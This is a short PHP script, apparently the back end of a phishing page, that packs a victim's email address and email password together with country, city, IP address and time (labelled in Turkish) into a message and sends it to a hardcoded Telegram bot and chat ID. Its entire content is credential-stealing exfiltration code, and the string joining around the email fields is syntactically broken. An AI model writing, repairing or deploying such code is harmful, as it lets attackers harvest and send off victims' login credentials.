<?php
    $token='1577669421:AAH37KKc3ErbIDS19ITZoPNSD6XwesJ5ceU';
    $data = [
        'text' => ' 
	Mail : '$email'
	Mail pw : '$email_pw'
	Ülke : '.$ulke.'
      Şehir : '.$sehir.'
      İp : '.$ip.'
      Tarih : '.$cur_time.'
      ',
      'chat_id' =>1519532487
    ];
    
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );


  
?>